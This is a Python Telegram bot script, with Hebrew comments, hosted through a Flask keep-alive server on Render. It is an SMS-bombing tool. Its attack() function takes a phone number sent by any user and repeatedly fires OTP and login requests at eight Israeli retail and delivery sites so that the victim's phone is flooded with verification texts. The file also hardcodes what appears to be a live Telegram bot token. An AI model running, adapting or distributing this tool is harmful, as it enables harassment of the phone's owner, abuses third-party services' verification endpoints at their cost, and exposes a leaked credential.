import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os

# --- 1. שרת Flask למניעת קריסה ב-Render ---
app = Flask('')

@app.route('/')
def home():
    return "Bot is Online!"

def run():
    # Render מגדיר את הפורט במשתנה סביבה
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- 2. הגדרת הבוט עם הטוקן שלך ---
API_TOKEN = '8788411826:AAEQdmRx5OVFB91zjRJrEaMJFghDp8Tayg0'
bot = telebot.TeleBot(API_TOKEN)

def attack(target):
    # פורמט מספר בינלאומי עבור אתרים מסוימים
    target_972 = "972" + target[1:] if target.startswith('0') else target
    
    apis = [
        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "t": "json", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "t": "json", "d": {"phoneNumber": target, "uuid": "c8b24899-349b-4838-8303-d279d4e2fffd"}},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "t": "json", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}},
        {"n": "Terminal X", "u": "https://www.terminalx.com/api/v1/auth/otp/send", "t": "json", "d": {"phone": target}},
        {"n": "Golf", "u": "https://www.golf-il.co.il/customer/ajax/post/", "t": "data", "d": {"form_key": "WaqdnLcdTj3jsiZw", "bot_validation": "1", "type": "login", "telephone": target, "code": "", "compare_email": "", "compare_identity": ""}},
        {"n": "Yellow", "u": "https://api.yellow.co.il/v1/auth/login", "t": "json", "d": {"phone": target}},
        {"n": "KSP", "u": "https://ksp.co.il/api/v1/auth/otp", "t": "json", "d": {"phone": target}},
        {"n": "Wolt", "u": "https://wolt.com/api/v1/user/check_phone_number", "t": "json", "d": {"phone_number": target_972}}
    ]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    for site in apis:
        try:
            if site["t"] == "json":
                res = requests.post(site["u"], json=site["d"], headers=headers, timeout=10)
            else:
                res = requests.post(site["u"], data=site["d"], headers=headers, timeout=10)
            print(f"Sent to {site['n']} - Status: {res.status_code}")
        except:
            pass
        time.sleep(1.2)

@bot.message_handler(func=lambda m: True)
def handle(m):
    target = m.text.strip()
    if target.isdigit() and len(target) >= 9:
        bot.reply_to(m, f"🚀 מתחיל שליחה ל-{target}...")
        attack(target)
        bot.send_message(m.chat.id, "✅ הסבב הסתיים.")
    else:
        bot.reply_to(m, "נא לשלוח מספר טלפון תקין.")

# --- 3. הפעלה סופית ---
if __name__ == "__main__":
    keep_alive()  # מפעיל את Flask בשרשור נפרד
    print("--- SERVER & BOT STARTING ---")
    bot.infinity_polling()  # שומר על הבוט פעיל ומקשיב להודעות
